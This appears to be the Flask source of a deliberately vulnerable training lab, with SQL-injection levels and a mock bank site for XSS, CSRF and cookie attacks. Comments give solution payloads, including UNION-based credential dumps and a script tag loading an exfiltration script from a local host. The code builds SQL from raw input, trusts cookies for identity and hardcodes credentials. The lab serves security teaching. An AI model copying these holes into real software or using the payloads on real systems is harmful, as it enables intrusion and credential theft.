#!/usr/bin/python3

from flask import Flask, render_template, request, redirect, url_for, session, make_response
from hashlib import md5
import pymysql.cursors, random, sys, logging

app = Flask(__name__)
log = logging.getLogger('werkzeug')
log.disabled = True

#sqli_injection passwords
passwords = {
             'level0':'level0',
             'level1':'epCcYKslEZHH23aRQ5WaRffjvDtpeI6U',
             'level2':'GWtcI7bXeUlxYlo092BHoiz1Y1XQXTbv',
             'level3':'HpuL6s7qYcRbtFAzWwGSNqYJ5tYW7757',
             'level4':'ApiBKyh5Xrk1WWTuPkkwNkMmP1RQW4co',
             'level5':'kO1eouNe1zQfCoTKJgEuFQbyzj5mPFzY',
             'level6':'luq5aOkUQFMLzcsWYqdIO3cxbBUyoA29',
             'level7':'1RIKHCNOPORksIqVHmSxuR762uFX8JwF',
             }



@app.route("/", methods=['GET','POST'])
def home():
    return render_template('home.html')

# Exploit:
# ' or 1=1 #
@app.route("/SQLi-level0", methods=['GET','POST'])
def SQLi_level0():
    connection = pymysql.connect(host='db',
                             user='user1',
                             password='Password1',
                             database='sql_injection',
                             cursorclass=pymysql.cursors.DictCursor)
    account = False
    if request.authorization and request.authorization.username == 'level0' and request.authorization.password == passwords['level0']:
        msg = ''
        if request.method == 'POST' and 'username' in request.form and 'password' in request.form:
            username = request.form['username'].replace("'","").replace('#','').replace('"','')
            password = request.form['password']
            with connection.cursor() as cursor:
                query = "SELECT * FROM level1 WHERE username = '%s' AND password = '%s' " %(username, password)
                print(query)
                try:
                    cursor.execute(query)
                    account = cursor.fetchone()
                except Exception as e:
                    print(e)
                if account:
                    learned = 'Be carefull of what users put in your form! '
                    newCreds = 'level1:'+passwords['level1']
                    return render_template('/SQLi/success.html', learned=learned, newCreds=newCreds)
                else:
                    msg = 'Incorrect password!'
                
        return render_template('SQLi/login.html', msg=msg, title='Level0', destination='SQLi_level0', source='sourcecodes/level0.txt')
    
    return make_response('Could not verify!',401, {'WWW-Authenticate':'Basic realm="Login Required"'})

# Exploit:
#' || 1=1 #
@app.route("/SQLi-level1", methods=['GET','POST'])
def SQLi_level1():
    connection = pymysql.connect(host='db',
                             user='user2',
                             password='Password2',
                             database='sql_injection',
                             cursorclass=pymysql.cursors.DictCursor)
    account = False
    if request.authorization and request.authorization.username == 'level1' and request.authorization.password == passwords['level1']:
        msg = ''
        if request.method == 'POST' and 'username' in request.form and 'password' in request.form:
            username = request.form['username'].replace("'","").replace('#','').replace('"','')
            password = request.form['password']

            blacklist = ['or','\'or','and','\'and']
            if any(ch in blacklist for ch in password.lower().split()):
                msg = 'Illegal character detected!'
            else:
                with connection.cursor() as cursor:
                    query = "SELECT * FROM level2 WHERE username = '%s' AND password = '%s' " %(username, password)
                    print(query)
                    try:
                        cursor.execute(query)
                        account = cursor.fetchone()
                    except Exception as e:
                        print(e)
                        
                    if account:
                        learned = 'Blacklists filter are not the solution!'
                        newCreds = 'level2:'+passwords['level2']
                        return render_template('/SQLi/success.html', learned=learned, newCreds=newCreds)

                    else:
                        msg = 'Incorrect password!'
    
        return render_template('SQLi/login.html', msg=msg, title='Level1', destination='SQLi_level1', source='sourcecodes/level1.txt')
    
    return make_response('Could not verify! go back home',401, {'WWW-Authenticate':'Basic realm="Login Required"'})

# Exploit:
#-1' UNION SELECT ALL username, password from level3 WHERE username LIKE 'level%' #
@app.route("/SQLi-level2", methods=['GET','POST'])
def SQLi_level2():
    connection = pymysql.connect(host='db',
                             user='user3',
                             password='Password3',
                             database='sql_injection',
                             cursorclass=pymysql.cursors.DictCursor)
    account = False
    if request.authorization and request.authorization.username == 'level2' and request.authorization.password == passwords['level2']:
        msg = ''
        if request.method == 'POST' and 'username' in request.form:
            username = request.form['username']
            with connection.cursor() as cursor:
                query = "SELECT id,username FROM level3 WHERE username = '%s'" % username
                print(query)
                try:
                    cursor.execute(query)
                    account = cursor.fetchone()
                except Exception as e:
                    print(e)

                if account:
                    msg = 'User exists ' + 'id:' + str(account['id']) + ' username:' + account['username']

        return render_template('SQLi/search.html', msg=msg, title='Level2', destination='SQLi_level2', source='sourcecodes/level2.txt')
    
    return make_response('Could not verify! go back home',401, {'WWW-Authenticate':'Basic realm="Login Required"'})

# Exploit:
#-1' UNION SELECT 1,database() #
#-1' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sql_injection'  #
#-1' UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'level4_TFadFGaD'  #
#-1' UNION SELECT 1,group_concat(username_FrSdAqER,':',password_OiUtFSaa SEPARATOR '\n') FROM level4_TFadFGaD #
@app.route("/SQLi-level3", methods=['GET','POST'])
def SQLi_level3():
    connection = pymysql.connect(host='db',
                             user='user4',
                             password='Password4',
                             database='sql_injection',
                             cursorclass=pymysql.cursors.DictCursor)
    account = False
    if request.authorization and request.authorization.username == 'level3' and request.authorization.password == passwords['level3']:
        msg = ''
        if request.method == 'POST' and 'username' in request.form:
            username = request.form['username']
            with connection.cursor() as cursor:
                query = "SELECT id_RjsAeRsR, username_FrSdAqER FROM level4_TFadFGaD WHERE username_FrSdAqER = '%s'" % username #commentato nel source della challenge
                print(query)
                try:
                    cursor.execute(query)
                    account = cursor.fetchone()
                except Exception as e:
                    print(e)

                if account:
                    msg = 'User exists ' + 'id:' + str(account['id_RjsAeRsR']) + ' username:' + account['username_FrSdAqER'] #commentato nel source della challenge

        return render_template('SQLi/search.html', msg=msg, title='Level3', destination='SQLi_level3', source='sourcecodes/level3.txt')
    
    return make_response('Could not verify! go back home',401, {'WWW-Authenticate':'Basic realm="Login Required"'})

#SQLi blind boolean based
@app.route("/SQLi-level4", methods=['GET','POST'])
def SQLi_level4():
    connection = pymysql.connect(host='db',
                             user='user5',
                             password='Password5',
                             database='sql_injection',
                             cursorclass=pymysql.cursors.DictCursor)
    account = False
    if request.authorization and request.authorization.username == 'level4' and request.authorization.password == passwords['level4']:
        msg = ''
        if request.method == 'POST' and 'username' in request.form:
            username = request.form['username']
            with connection.cursor() as cursor:
                query = "SELECT * FROM level5 WHERE username = '%s'" % username
                print(query)
                try:
                    cursor.execute(query)
                    account = cursor.fetchone()
                except Exception as e:
                    print(e)
                if account:
                    msg = 'User exists !'
                else:
                    msg = 'This user do not exists!'            

        return render_template('SQLi/search.html', msg=msg, title='Level4', destination='SQLi_level4', source='sourcecodes/level4.txt')
    
    return make_response('Could not verify! go back home',401, {'WWW-Authenticate':'Basic realm="Login Required"'})

#SQLi blind time based
@app.route("/SQLi-level5", methods=['GET','POST'])
def SQLi_level5():
    connection = pymysql.connect(host='db',
                             user='user6',
                             password='Password6',
                             database='sql_injection',
                             cursorclass=pymysql.cursors.DictCursor)
    account = False
    if request.authorization and request.authorization.username == 'level5' and request.authorization.password == passwords['level5']:
        msg = ''
        if request.method == 'POST' and 'username' in request.form:
            username = request.form['username']
            with connection.cursor() as cursor:
                query = "SELECT * FROM level6 WHERE username = '%s'" % username
                print(query)
                try:
                    cursor.execute(query)
                    account = cursor.fetchone()
                except Exception as e:
                    print(e)
                # if account:
                #   msg = 'user exists !'
                # else:
                #   msg = 'this user do not exists!'

        return render_template('SQLi/search.html', msg=msg, title='Level5', destination='SQLi_level5', source='sourcecodes/level5.txt')
    
    return make_response('Could not verify! go back home',401, {'WWW-Authenticate':'Basic realm="Login Required"'})

#SQLi bruteforce md5 hash reflection of random strings
@app.route("/SQLi-level6", methods=['GET','POST'])
def SQLi_level6():
    connection = pymysql.connect(host='db',
                             user='user7',
                             password='Password7',
                             database='sql_injection',
                             cursorclass=pymysql.cursors.DictCursor)
    account = False
    if request.authorization and request.authorization.username == 'level6' and request.authorization.password == passwords['level6']:
        msg = ''
        if request.method == 'POST' and 'username' in request.form and 'password' in request.form:
            username = request.form['username'].replace("'","").replace('#','').replace('"','')
            password = request.form['password']
            hashedPassword = md5(password.encode('utf-8'))

            with connection.cursor() as cursor:
                query = "SELECT * FROM level7 WHERE username = '%s' AND password = '%s' " %(username, str(hashedPassword.digest())[2:-1])
                print(query)
                try:
                    cursor.execute(query)
                    account = cursor.fetchone()
                except Exception as e:
                    print(e)
                if account:
                    learned = 'raw hashes are dangerous with SQL!'
                    return render_template('/SQLi/success.html', learned=learned, newCreds='You completed all SQL-injection levels!')
                else:
                    msg = 'Incorrect password!'

        return render_template('SQLi/login.html', msg=msg, title='Level6', destination='SQLi_level6', source='sourcecodes/level6.txt')
    
    return make_response('Could not verify! go back home',401, {'WWW-Authenticate':'Basic realm="Login Required"'})

##############################Client Attacks###########################################

#pulisce i messaggi e la descrizione inserita dall'utente
def clearString(s):
	
	#initial cleaning (\n\r\t)
	s = s.replace("\n"," ").replace("\t"," ").replace("\r"," ")

	#remove double or more space between words
	words = s.strip().split()
	return ' '.join(words)


#genera un id casuale garantendo l'unicita nel database
def selectRandomId():
    bankconnection = pymysql.connect(host='db',
                            user='bankadmin',
                            password='SuperAdminPassword!',
                            database='banksystem',
                            cursorclass=pymysql.cursors.DictCursor)
    with bankconnection.cursor() as cursor:
        try:
            cursor.execute("SELECT id from accounts")
            ids = cursor.fetchall()
        except Exception as e:
            print(e)
        
        while 1:
            random_id = random.randint(0,1000)
            #print(admin_id)
            if random_id not in [x['id'] for x in ids]:
                random_id = str(random_id)
                break
        return random_id

#reset dei soldi, inizializzazione id admin (for cookie bruteforce)
def BankInitialize():
    bankconnection = pymysql.connect(host='db',
                             user='bankadmin',
                             password='SuperAdminPassword!',
                             database='banksystem',
                             cursorclass=pymysql.cursors.DictCursor)
    
    global admin_id
    admin_id = selectRandomId()
    
    with bankconnection.cursor() as cursor:
        try:
            cursor.execute("UPDATE accounts SET id = %s WHERE username = 'admin'" % admin_id)
            cursor.execute("UPDATE accounts SET moneys = 100")
            cursor.execute("UPDATE accounts SET description = 'None' WHERE username <> 'admin'")
            cursor.execute('DELETE from messages')
            bankconnection.commit()
        except Exception as e:
            print(e)


@app.route("/BankLogin", methods=['GET','POST'])
def BankLogin():
    bankconnection = pymysql.connect(host='db',
                             user='bankadmin',
                             password='SuperAdminPassword!',
                             database='banksystem',
                             cursorclass=pymysql.cursors.DictCursor)
    msg = ''
    if request.method == 'POST' and 'username' in request.form and 'password' in request.form:
        username = request.form['username'].replace("'","").replace('"',"").replace('#',"").replace('-',"").replace(' ',"")
        password = request.form['password']
        hashedPassword = md5(password.encode('utf-8'))
        with bankconnection.cursor() as cursor:
            query = "SELECT * FROM accounts WHERE username = '%s' AND password = '%s' " %(username, hashedPassword.hexdigest()) #SICURO A SQLi
            print(query)
            try:
                cursor.execute(query)
                account = cursor.fetchone()
            except Exception as e:
                    print(e)

            if account:
                resp = make_response(redirect(url_for('BankHome')))
                resp.set_cookie('loggedin','True')
                resp.set_cookie('id',str(account['id']))
                resp.set_cookie('username',account['username'])
                if account['username'] == 'admin':
                    resp.set_cookie('s3cr3t-c00ki3','True')
                return resp
            else:
                msg = 'Incorrect password!'
                
    return render_template('ClientAttack/login.html',destination = 'BankLogin', msg = msg)

@app.route("/BankLogout")
def BankLogout():
    resp = make_response(redirect(url_for('BankHome')))
    resp.set_cookie('loggedin', '', expires=0)
    resp.set_cookie('id', '', expires=0)
    resp.set_cookie('username', '', expires=0)
    try:
        resp.set_cookie('s3cr3t-c00ki3', '', expires=0)
    except Exception as e:
        pass
    return resp

@app.route("/BankRegister", methods=['GET','POST'])
def BankRegister():
    bankconnection = pymysql.connect(host='db',
                             user='bankadmin',
                             password='SuperAdminPassword!',
                             database='banksystem',
                             cursorclass=pymysql.cursors.DictCursor)
    msg = ''
    if request.method == 'POST' and 'username' in request.form and 'password' in request.form and 'email' in request.form:

        username = request.form['username']
        password = request.form['password']
        hashedPassword = md5(password.encode('utf-8'))
        email = request.form['email']
        random_id = selectRandomId()

        with bankconnection.cursor() as cursor:
            query = "SELECT * FROM accounts WHERE username = '%s' OR email = '%s' " % (username,email)
            print(query)
            try:
                cursor.execute(query)
                account = cursor.fetchone()
            except Exception as e:
                print(e)

            if account:
                msg = 'Account already exists'
            else:
                cursor.execute('INSERT INTO accounts VALUES (%s, %s, %s, %s, NULL, 100)', (random_id,username, hashedPassword.hexdigest(), email,))
                bankconnection.commit()
                msg = 'You have successfully registered!'

    elif request.method == 'POST':
        msg = 'Please fill out the form!'

    return render_template('ClientAttack/register.html', msg=msg)

@app.route("/BankHome")
def BankHome():
    bankconnection = pymysql.connect(host='db',
                             user='bankadmin',
                             password='SuperAdminPassword!',
                             database='banksystem',
                             cursorclass=pymysql.cursors.DictCursor)
    if request.cookies.get('loggedin') == 'True':
        with bankconnection.cursor() as cursor:
            query = "SELECT * FROM accounts WHERE id = '%s'" % request.cookies.get('id')
            print(query)
            try:
                cursor.execute(query)
                account = cursor.fetchone()
            except Exception as e:
                print(e)
        if account:
            username = account['username']
        else:
            username = ''
        
        return render_template('ClientAttack/bankhome.html', username = username, admin_id = admin_id)

    return redirect(url_for('BankLogin'))

# PAYLOAD: <script src="http://127.0.0.1:8081/exfilBody.js"></script>
@app.route("/BankProfile",methods=['GET','POST'])
def BankProfile():
    bankconnection = pymysql.connect(host='db',
                             user='bankadmin',
                             password='SuperAdminPassword!',
                             database='banksystem',
                             cursorclass=pymysql.cursors.DictCursor)
    defaultMoney = 100
    msg = ''
    if (request.cookies.get('id') != admin_id and request.cookies.get('loggedin') == 'True') or (request.cookies.get('id') == admin_id and request.cookies.get('s3cr3t-c00ki3') == 'True' and request.cookies.get('loggedin') == 'True'):
        with bankconnection.cursor() as cursor:
            query = "SELECT * FROM accounts WHERE id = '%s'" % request.cookies.get('id')
            print(query)
            try:
                cursor.execute(query)
                account = cursor.fetchone()
            except Exception as e:
                print(e)
            if account and account['moneys'] > defaultMoney:
                msg = '{FLAG1-AScj!W2da}'
            
            if request.method == 'POST' and 'description' in request.form:
                description = clearString(request.form['description']).replace("'"," ")
                try:
                    with bankconnection.cursor() as cursor:
                        query = "UPDATE accounts SET description = '%s' WHERE username = '%s'" %(description, request.cookies.get('username'))
                        print(query)
                        cursor.execute(query)
                        bankconnection.commit()
                        return redirect(url_for('BankProfile'))

                except Exception as e:
                    print(e)
                    msg = 'Sorry! an error occorred!'
            
            return render_template('ClientAttack/profile.html', account = account, msg=msg, admin_id = admin_id)
    return redirect(url_for('BankLogin'))

@app.route("/BankTransferMoney",methods=['GET','POST'])
def BankTransferMoney():
    bankconnection = pymysql.connect(host='db',
                             user='bankadmin',
                             password='SuperAdminPassword!',
                             database='banksystem',
                             cursorclass=pymysql.cursors.DictCursor)
    msg = ''
    
    if (request.cookies.get('id') != admin_id and request.cookies.get('loggedin') == 'True') or (request.cookies.get('id') == admin_id and request.cookies.get('s3cr3t-c00ki3') == 'True' and request.cookies.get('loggedin') == 'True'):
        if request.method == 'POST' and 'destinationEmail' in request.form and 'amount' in request.form:
            if request.cookies.get('username') == 'admin':
                destination = request.form['destinationEmail']
                amount = request.form['amount']
                with bankconnection.cursor() as cursor:

                    query = "SELECT * FROM accounts WHERE email = '%s'" % destination
                    try:
                        cursor.execute(query)
                        account = cursor.fetchone()
                    except Exception as e:
                        print(e)
                    if account:

                        query = "UPDATE accounts SET moneys = moneys + %s WHERE email = '%s'" % (amount, destination)
                        try:
                            cursor.execute(query)
                            bankconnection.commit()
                        except Exception as e:
                            print(e)
                        msg = 'Money transfered succesfully!'

                    else:
                        msg = 'Account destination does not exists!'
            else:
                msg = 'Only an admin can transfers moneys!'

        return render_template('ClientAttack/transfer.html', msg=msg, admin_id = admin_id)
    
    return redirect(url_for('BankLogin'))

# PAYLOAD: http://127.0.0.1:81/csrf.html
@app.route("/BankRequestSupport",methods=['GET','POST'])
def BankRequestSupport():
    bankconnection = pymysql.connect(host='db',
                             user='bankadmin',
                             password='SuperAdminPassword!',
                             database='banksystem',
                             cursorclass=pymysql.cursors.DictCursor)
    if request.cookies.get('loggedin') == 'True' and request.cookies.get('id') != admin_id:
        msg = ''
        if request.method == 'POST' and 'text' in request.form:
            text = clearString(request.form['text'])
            print(text)
            try:
                with bankconnection.cursor() as cursor:
                    cursor.execute('INSERT INTO messages VALUES (NULL, %s, %s)', (request.cookies.get('username'), text,))
                    bankconnection.commit()
                    msg = 'Requests sent succesfully, we\'ll recontact you soon!'
            except Exception as e:
                print(e)
                msg = 'Sorry! an error occorred!'
    
        return render_template('ClientAttack/support.html', msg=msg, admin_id = admin_id)
    
    return redirect(url_for('BankLogin'))

@app.route("/BankInboxRequests",methods=['GET','POST'])
def BankInboxRequests():
    bankconnection = pymysql.connect(host='db',
                             user='bankadmin',
                             password='SuperAdminPassword!',
                             database='banksystem',
                             cursorclass=pymysql.cursors.DictCursor)
    if request.cookies.get('loggedin') == 'True':
        if request.cookies.get('id') == admin_id:
            try:
                with bankconnection.cursor() as cursor:
                    cursor.execute('SELECT * FROM messages')
                    messages = cursor.fetchall()
                    print(messages)
            except Exception as e:
                print(e)
            return render_template('ClientAttack/inboxrequests.html', messages=messages, admin_id = admin_id)
        else:
            return "Sorry but only an admin can view this page"
    
    return redirect(url_for('BankLogin'))

@app.route("/BankSearchUser",methods=['GET','POST'])
def BankSearchUser():
    bankconnection = pymysql.connect(host='db',
                             user='bankadmin',
                             password='SuperAdminPassword!',
                             database='banksystem',
                             cursorclass=pymysql.cursors.DictCursor)
    if (request.cookies.get('id') != admin_id and request.cookies.get('loggedin') == 'True') or (request.cookies.get('id') == admin_id and request.cookies.get('s3cr3t-c00ki3') == 'True' and request.cookies.get('loggedin') == 'True'):
        msg = ''
        account = None
        if request.method == 'POST' and 'user' in request.form:
            username = request.form['user']
            if username == 'admin':
                msg = 'You can\'t search information about our admin!'
            else:
                try:
                    with bankconnection.cursor() as cursor:
                        query = "SELECT * FROM accounts WHERE username = '%s'" % username
                        print(query)
                        cursor.execute(query)
                        account = cursor.fetchone()
                        if not account:
                            msg = 'This user do not exists!'        
                except Exception as e:
                    print(e)
    
        return render_template('ClientAttack/searchuser.html', msg=msg, admin_id = admin_id, account=account)
    return redirect(url_for('BankLogin')) 

if __name__ == '__main__':
    BankInitialize()
    app.run(host="0.0.0.0")
